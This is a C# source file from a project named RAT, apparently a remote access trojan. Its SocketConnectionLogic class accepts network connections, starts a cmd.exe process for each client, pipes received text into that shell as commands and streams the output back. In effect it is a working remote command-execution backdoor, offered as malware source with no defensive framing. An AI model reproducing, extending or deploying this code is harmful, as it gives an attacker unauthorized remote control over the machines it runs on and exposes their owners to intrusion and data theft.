using RAT.src.Helpers;
using RAT.src.Models;
using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;

namespace RAT.src.Sockets
{
    /// <summary>
    /// Contains methods related to socket connection handling (accepting, listening, sending, etc...)
    /// </summary>
    public class SocketConnectionLogic
    {
        /// <summary>
        ///  Out client state, the one who connected.
        /// </summary>
        private StateObject _clientState { get; set; }

        /// <summary>
        /// Socket receival logic handling. Is called as first one.
        /// </summary>
        /// <param name="res">Status of asynchronous operation.</param>
        public void OnAccept(IAsyncResult res)
        {
            // Signal the main thread to continue.
            ManualResetEventWrapper.ResetEvent.Set();

            // Get the socket that handles the client request.
            Socket listener = (Socket)res.AsyncState;
            Socket handler = listener.EndAccept(res);

            // Create the state object with cmd process attached to client.
            // This represents client with all needed information.
            _clientState = new StateObject()
            {
                ClientSocket = handler,
                AsyncState = res,
                ClientCmdProcess = new Process()
                {
                    StartInfo = CmdHelper.GetCmdStartupConfiguration(),
                },
            };

            // Cmd output handler which will redirect output result to client after command is executed.
            _clientState.ClientCmdProcess.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);

            // Launch cmd process.
            _clientState.ClientCmdProcess.Start();
            _clientState.ClientCmdProcess.BeginOutputReadLine();

            // We are ready to accept cmd commands.
            handler.BeginReceive(_clientState.DataArray, 0, _clientState.DataArray.Length, 0, OnReceive, _clientState);
        }

        /// <summary>
        /// Socket receival logic handling.
        /// </summary>
        /// <param name="res">Status of asynchronous operation.</param>
        private void OnReceive(IAsyncResult res)
        {
            // Read data from the client socket.
            (Socket socket, StateObject state) = this.GetSocketAndStateFromAsyncResult(res);

            int bytesRead = 0;
            try
            {
                bytesRead = socket.EndReceive(res);
            }
            catch (SocketException)
            {
                // If some error occured during receival, then we are disconnecting client but preserving socket and connection,
                // so he could connect again immediately (in case if some error occured on his side)
                socket.BeginDisconnect(reuseSocket: true, OnDisconnect, state);
            }

            // There might be more data, so store the data received so far.
            state.DataBuilder.Append(Encoding.ASCII.GetString(state.DataArray, 0, bytesRead));
            string content = state.DataBuilder.ToString();
            if (string.IsNullOrEmpty(content))
            {
                return;
            }

            // Check for end of command character (new line) in client command. If it is not there, read
            // more data.
            if (!content.Contains("\n"))
            {
                // Not all data received. Get more.
                socket.BeginReceive(state.DataArray, 0, state.DataArray.Length, 0, OnReceive, state);
            }
            else
            {
                // Updating user state.
                _clientState = state;
                _clientState.AsyncState = res;

                // Execute command.
                _clientState.ClientCmdProcess.StandardInput.WriteLine(
                    Encoding.Default.GetString(state.DataArray));

                // Clear state data after command execution.
                _clientState.DataBuilder.Clear(); // Command is stored here in string format.
                _clientState.DataArray = new byte[1024]; // Command is stored here in byte command.
            }

            // Continue on listening for other commands.
            socket.BeginReceive(_clientState.DataArray, 0, _clientState.DataArray.Length, SocketFlags.None, OnReceive, socket);
        }

        /// <summary>
        /// Socket sending logic handling.
        /// </summary>
        /// <param name="res">Status of asynchronous operation.</param>
        private void OnSend(IAsyncResult res)
        {
            (Socket socket, _) = this.GetSocketAndStateFromAsyncResult(res);
            socket.EndSend(res);
        }

        /// <summary>
        /// Disconnects client from socket without closing connection itself and kills process associated with client.
        /// </summary>
        /// <param name="res">State of async socket operation.</param>
        private void OnDisconnect(IAsyncResult res)
        {
            (Socket socket, _) = this.GetSocketAndStateFromAsyncResult(res);
            socket.EndDisconnect(res);
            _clientState.ClientCmdProcess.Kill();
        }

        /// <summary>
        /// This will send command execution output result to client.
        /// </summary>
        /// <param name="sendingProcess">Sender.</param>
        /// <param name="outLine">Event sender's data.</param>
        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (_clientState?.DataArray != null && outLine.Data != null && !_clientState.ClientCmdProcess.HasExited)
            {
                string cleanCmd = CmdHelper.FormatCmdForResponse(outLine.Data);

                _clientState.ClientSocket.BeginSend(
                    Encoding.ASCII.GetBytes(cleanCmd),
                    0,
                    cleanCmd.Length,
                    SocketFlags.None,
                    OnSend,
                    _clientState.ClientSocket);
            }
        }

        /// <summary>
        /// Trivial steps to get socket and state from async result during socket connections, also binds results to client StateObject.
        /// </summary>
        /// <param name="result">Status of async operation.</param>
        /// <returns>Socket and update state object.</returns>
        private (Socket, StateObject) GetSocketAndStateFromAsyncResult(IAsyncResult result)
        {
            // Retrieve the state object and the handler socket
            // from the asynchronous state object.
            // IAsyncResult in this case can be StateObject or Socket.
            Socket handler = null;
            StateObject state = null;
            if (result.AsyncState is StateObject)
            {
                state = (StateObject)result.AsyncState;
                handler = state.ClientSocket;
            }
            else
            {
                // Get the socket that handles the client request
                // and update state object with it's values.
                handler = (Socket)result.AsyncState;
                state = _clientState;
            }

            // Updating client state with new state.
            this.UpdateClientState(handler, result);
            return (handler, state);
        }

        /// <summary>
        /// Updates clients state with relevant information.
        /// </summary>
        /// <param name="socket">Operation socket.</param>
        /// <param name="result">Async state of socket.</param>
        private void UpdateClientState(Socket socket, IAsyncResult result)
        {
            _clientState.ClientSocket = socket;
            _clientState.AsyncState = result;
        }
    }
}